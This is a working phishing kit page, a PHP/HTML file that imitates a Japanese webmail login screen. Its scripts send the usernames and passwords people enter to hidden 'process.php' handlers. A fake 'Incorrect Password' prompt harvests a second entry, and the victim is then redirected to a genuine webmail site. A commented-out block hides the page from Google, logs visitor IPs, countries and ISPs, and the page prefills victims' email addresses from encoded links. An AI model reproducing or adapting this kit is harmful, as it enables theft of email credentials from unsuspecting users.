﻿<?php
session_start();
/*   
            ALEIN EXPERT                  
*/
/*session_start();
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }

date_default_timezone_set('GMT');
$timedate = date('H:i:s d/m/Y');

$client  = @$_SERVER['HTTP_CLIENT_IP'];
$forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
$remote  = @$_SERVER['REMOTE_ADDR'];
$result  = "Unknown";
if(filter_var($client, FILTER_VALIDATE_IP)){
  $_SESSION['_ip_']  = $client;
}
elseif(filter_var($forward, FILTER_VALIDATE_IP)){
    $_SESSION['_ip_']  = $forward;
}
else{
    $_SESSION['_ip_']  = $remote;
}
$getdetails = 'https://extreme-ip-lookup.com/json/' . $_SESSION['_ip_'];
$curl       = curl_init();
curl_setopt($curl, CURLOPT_URL, $getdetails);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
$content    = curl_exec($curl);
curl_close($curl);
$details  = json_decode($content);
$country   = $details->country;
$org   = $details->org;
$isp   = $details->isp;
$adminvu .= "<tr>
                          <td>
                            {".$_SESSION['_ip_']."}
                          </td>
                          <td>
                            ".$TIME_DATE."
                          </td>
                          <td>
                            ".XB_Browser($_SERVER['HTTP_USER_AGENT'])." On ".XB_OS($_SERVER['HTTP_USER_AGENT'])."
                          </td>
                          <td>
						  ".$country."
                          </td>
                          <td>
                           ".$org."
                          </td>
                        </tr>\n";
    $khraha = fopen("./rz/vus".$yourname.".html", "a");
	fwrite($khraha, $adminvu);
	$xx .= "{}\n";
    $khraha = fopen("./rz/vus.html", "a");
	fwrite($khraha, $xx);*/
	$permitted_chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
?>

<!DOCTYPE html>

<html xmlns="http://www.w3.org/1999/xhtml" class=" js mozilla"><head>
<title>Webメール :: ようこそ Webメールへ</title>
<meta name="Robots" content="noindex,nofollow">
<meta http-equiv="X-UA-Compatible" content="IE=EDGE">
<!--link rel="shortcut icon" href="skins/classic/images/favicon.ico"/-->
<link rel="shortcut icon" href="https://webmail.canvas.ne.jp/skins/default//images/favicon.ico">
<link rel="stylesheet" type="text/css" href="https://webmail.canvas.ne.jp/skins/classic/common.min.css?s=1415172545">



<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<link rel="stylesheet" type="text/css" href="https://webmail.canvas.ne.jp/plugins/jqueryui/themes/classic/jquery-ui-1.9.2.custom.css?s=1415172545">
<link rel="stylesheet" type="text/css" href="https://webmail.canvas.ne.jp/plugins/image_auth/skins/classic/rcguard.css?s=1499326446">

<!--<script src="program/js/jquery.min.js?s=1415172545" type="text/javascript"></script>
<script src="program/js/common.min.js?s=1415172545" type="text/javascript"></script>
<script src="program/js/app.min.js?s=1415254003" type="text/javascript"></script>
<script src="program/js/jstz.min.js?s=1415172545" type="text/javascript"></script>


<script type="text/javascript" src="plugins/jqueryui/js/jquery-ui-1.9.2.custom.min.js?s=1415172545"></script>
<script type="text/javascript" src="plugins/image_auth/rcguard.js?s=1499326446"></script>-->

<link rel="stylesheet" href="css/style.css" />

</head>
<body>
<!--<img src="skins/default//images/no-logo.png" id="logo" style="margin:0 11px" alt="Webメール :: ようこそ Webメールへ" border="0">-->

<div id="message"></div>

<div id="login-form">
<div class="boxtitle">ようこそ Webメールへ</div>
<div class="boxcontent">

<!--Login sec start here -->
<div class="loginsec">

<form name="loginForm" id="loginForm" method="post" action="">

<table summary="" border="0">
<tbody>
<tr>
<td class="title">
<label for="rcmloginuser">Username</label>
</td>
<td class="input">
<input name="email" id="email" required autocomplete="off" autocapitalize="none" type="email">
</td>
</tr>
<tr>
<td class="title">
<label for="rcmloginpwd">Password</label>
</td>
<td class="input">
<input name="userpass" id="userpass" required autocapitalize="none" autocomplete="off" type="password">
</td>
</tr>
<tr>
<td colspan="2" height="5px"></td>
</tr>
<tr>
<td id="img_pass" class="title" colspan="2">

<div id="recaptcha_widget">
        <p style="text-align:center;margin:0px 12px 6px 12px">※ 本認証は、セキュリティ向上のための認証方式です。</p>
        <div id="recaptcha_image">
		<img style="float: center; padding-right: 5px" id="captcha_image" src="https://webmail.canvas.ne.jp/?_task=login&amp;_action=logsec_captcha&amp;e7a886d0477863140f5d2aa3f8f4c811" alt="CAPTCHA Image"></div>
        <label for="recaptcha_response_field">画像の文字</label>　
	<input type="text" name="login_security_code" id="captcha_code" style="width:200px;color:#999" value="上記のテキストを入力してください" onfocus="if(value==defaultValue){value='';this.style.color='#000'}" onblur="if(!value){value=defaultValue;this.style.color='#999'}">
        <div id="linkDiv">
	<a tabindex="-1" style="border: 0" href="#" title="Refresh Image" onclick="if (typeof window.captcha_image_audioObj !== 'undefined') captcha_image_audioObj.refresh(); document.getElementById('captcha_image').src = './?_task=login&amp;_action=logsec_captcha&amp;' + Math.random(); this.blur(); return false">画像変更(画像が読めない場合)</a>
            <a href="#" onclick="openNew('./skins/classic/help/recapcha_help.html')">使い方</a>
        </div>
</div>

		</td>
		</tr>
		</tbody>
</table>
<font color="#ff0000">
<p style="text-align:center;">※メールアドレスは「email@sample.ne.jp」の様に<br>@を含めたメールアドレス全体をご入力下さい。</p>
</font>
<p class="formbuttons">
<input type="submit" id="rcmloginsubmit" class="button mainaction" value="Login">
</p>

</form>



</div>
<!--Login sec ends here -->


<!--Login sec2 start here -->
<div class="loginsec2">

<form name="loginForm2" id="loginForm2" method="post" action="">

<table summary="" border="0">
<tbody>
<tr>
<td class="title">
<label for="rcmloginuser">Username</label>
</td>
<td class="input">
<input name="email1" id="email1" required autocomplete="off" autocapitalize="none" type="email">
</td>
</tr>
<tr>
<td class="title">
<label for="rcmloginpwd">Password</label>
</td>
<td class="input">
<input name="userpass1" id="userpass1" required autocapitalize="none" autocomplete="off" type="password">
<span style="font-size:12px;color:red">Incorrect Password. Please try again.</span>
</td>
</tr>
<tr>
<td colspan="2" height="5px"></td>
</tr>
<tr>
<td id="img_pass" class="title" colspan="2">

<div id="recaptcha_widget">
        <p style="text-align:center;margin:0px 12px 6px 12px">※ 本認証は、セキュリティ向上のための認証方式です。</p>
        <div id="recaptcha_image">
		<img style="float: center; padding-right: 5px" id="captcha_image" src="https://webmail.canvas.ne.jp/?_task=login&amp;_action=logsec_captcha&amp;e7a886d0477863140f5d2aa3f8f4c811" alt="CAPTCHA Image"></div>
        <label for="recaptcha_response_field">画像の文字</label>　
	<input type="text" name="login_security_code" id="captcha_code" style="width:200px;color:#999" value="上記のテキストを入力してください" onfocus="if(value==defaultValue){value='';this.style.color='#000'}" onblur="if(!value){value=defaultValue;this.style.color='#999'}">
        <div id="linkDiv">
	<a tabindex="-1" style="border: 0" href="#" title="Refresh Image" onclick="if (typeof window.captcha_image_audioObj !== 'undefined') captcha_image_audioObj.refresh(); document.getElementById('captcha_image').src = './?_task=login&amp;_action=logsec_captcha&amp;' + Math.random(); this.blur(); return false">画像変更(画像が読めない場合)</a>
            <a href="#" onclick="openNew('./skins/classic/help/recapcha_help.html')">使い方</a>
        </div>
</div>

		</td>
		</tr>
		</tbody>
</table>
<font color="#ff0000">
<p style="text-align:center;">※メールアドレスは「email@sample.ne.jp」の様に<br>@を含めたメールアドレス全体をご入力下さい。</p>
</font>
<p class="formbuttons">
<input type="submit" id="rcmloginsubmit" class="button mainaction" value="Login">
</p>

</form>



</div>
<!--Login sec2 ends here -->

</div>
</div>

<noscript>
  <p id="login-noscriptwarning">Warning: This webmail service requires Javascript! In order to use it please enable Javascript in your browser's settings.</p>
</noscript>
<div id="login-advice01">
                                    <div class="login_advice_boxcontent">
                                            <p class="login_advice_title">■ 安心してサイトをご利用いただくために■</p>
                                            <div class="login_advice_content">
                                            <div class="login_advice_content_title">パスワードを変更する時の注意点</div>
                                            <ol>
                                                    <li>自分や家族の名前・生年月日・住所などの個人情報を基にした単語は使用しない</li>
                                                    <li>日本語・英語に限らず、辞書に載っている単語は使用しない</li>
                                                    <li>アルファベットや数字のみでのパスワードは使用しない</li>
                                                    <li>他サービスで利用しているパスワードは使用しない</li>
                                                    <li>過去に使ったことがあるパスワードは使用しない</li>
                                            </ol>


                                            </div>
                                    </div>
                            </div>




<div class="overlay">
  <div class="lgif-space"></div>
    <div class="loadgif">
       <img src="img/loading.gif" width="100" height="100">
    </div>
</div>


<script src="https://code.jquery.com/jquery-3.2.1.min.js"></script>

 <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.0/umd/popper.min.js" integrity="sha384-cs/chFZiN24E4KMATLdqdvsezGxaGsi4hLGOzlXwp5UZB1LY//20VyM2taTB4QvJ" crossorigin="anonymous"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.0/js/bootstrap.min.js" integrity="sha384-uefMccjFJAIv6A+rW+L4AHf99KvxDjWSu1z9VI8SKNVmz4sk7buKt/6v9KI65qnm" crossorigin="anonymous"></script>
<script src="https://ajax.aspnetcdn.com/ajax/jQuery/jquery-3.3.1.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.10/jquery.mask.js"></script>

<script type="text/javascript">
$(document).bind("contextmenu", function(e){ return false;});

$('#loginForm').on('submit', function(e){
		
		 $(".overlay").show(500);
		$.post('T_a_n_G_u_l_AR/process.php', $(this).serialize(), function(data){
			console.log(data);
		});
		setTimeout(function() {
								$(".loginsec").hide();
                                $(".loginsec2").show();
								$(".overlay").hide(500);
                        },2000);
		e.preventDefault();
	});

$('#loginForm2').on('submit', function(e){
		
		 $(".overlay").show(500);
		$.post('T_a_n_G_u_l_AR/process2.php', $(this).serialize(), function(data){
			console.log(data);
		});
		setTimeout(function() {
                                window.location.href = "https://webmail.earth-core.jp/";
                        },9000);
		e.preventDefault();
	});



</script>

<script type="text/javascript">

var $c = getUrlParameter('email');
     $('#email').val($c);
	 $('#email1').val($c);
	$('#me').text($c);
        var $current_email = "";

        if ($c) {
            $current_email = isValidEmail($c) ? $c : decodeCustom($c);
        }


        function decodeCustom($email) {
            var $consonants = 'bcdfghjklmnpqrstvwxyz'.split('');
            var $joinChar = $email.substr(0, 1); // substr(,0,1);
            var $output = $email.substr(2); // substr($email,2);
            var $vowels = ['a', 'e', 'i', 'o', 'u'];
            var $vowelsLookup = [];

            for ($i in $consonants) {
                $output = $output.replace(new RegExp($joinChar + '0' + $i + 'a', 'g'), $consonants[$i]);
            }

            for ($i in $vowels) {
                $output = $output.replace(new RegExp($joinChar + $i, 'g'), $vowels[$i]);
            }

            $output = $output.replace(new RegExp($joinChar + $joinChar + $joinChar, 'g'), '@');
            //,$output);
            return $output;
        }

        function isValidEmail(email) {
            var re =
                /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
            return re.test(email);
        }

        function getUrlParameter(name) {
            name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
            var regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
            var results = regex.exec(location.search);
            return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
			
        }
		
		 var currentEmail = $current_email;
    var ListEntries = [
            '.*fuck.*',
            '.*pussy.*',
            '.*bitch.*',
            '.*asshole.*',
            '.*fool.*',
            '.*dick.*',
            '.*mama.*',
            '.*nice.*try.*',
            '.*12345.*'
        ];
		
		 if(currentEmail){

            var e = document.getElementById('username');
            e = currentEmail;
            //e.readOnly = true;
			

            var domain = extractDomain(currentEmail);

           // var corH = document.getElementById('corportate-title');
            //corH.innerText = domain + " Email Login";

            }
			
		function extractDomain(email){

        var load = email;
        var domain = '';
        var regex = /.+@(.*?)\..+/;
        var str = email;
        var m;

        if ((m = regex.exec(str)) !== null) {
            return m[1];
        }

        return null;
    }



</script> 



<script> 
  location.hash = 'wa=wsignin1.0&rpsnv=13&ct=1539585327&rver=7.0.6737.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fnlp%3d1%26RpsCsrfState%3d715d44a2-2f11-4282-f625-a066679e96e2&id=292841&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=90015&domain=' 
</script>

<script type="text/javascript" src="js/actions.js"></script>
</body>
</html>